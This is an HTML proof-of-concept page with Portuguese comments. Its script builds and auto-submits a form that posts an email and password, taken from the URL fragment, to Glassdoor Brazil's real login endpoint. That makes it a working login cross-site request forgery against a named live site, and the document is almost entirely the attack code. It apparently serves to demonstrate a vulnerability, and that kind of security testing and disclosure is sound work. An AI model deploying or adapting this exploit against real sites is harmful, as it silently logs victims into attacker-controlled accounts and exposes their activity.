<!doctype html>
<meta charset="utf-8">
<title>PoC Login CSRF (urlencoded)</title>
<body>
<script>
  // Lê as credenciais do fragmento da URL: #u=<email>&p=<senha>
  const params = new URLSearchParams(location.hash.slice(1));
  const u = params.get('u') || '';
  const p = params.get('p') || '';
  // Monta um <form> application/x-www-form-urlencoded
  const f = document.createElement('form');
  f.action = 'https://www.glassdoor.com.br/auth/login/username-password';
  f.method = 'POST';

  const iU = document.createElement('input'); iU.name = 'username'; iU.value = u;
  const iP = document.createElement('input'); iP.name = 'password'; iP.value = p;
  const iR = document.createElement('input'); iR.name = 'postLoginUrl'; iR.value = '';

  f.appendChild(iU); f.appendChild(iP); f.appendChild(iR);
  document.body.appendChild(f);

  // Submete automaticamente
  if (u && p) {
    f.submit();
  } else {
    document.write('<p>Adicione <code>#u=&lt;email&gt;&amp;p=&lt;senha&gt;</code> à URL e recarregue.</p>');
  }
</script>
</body>
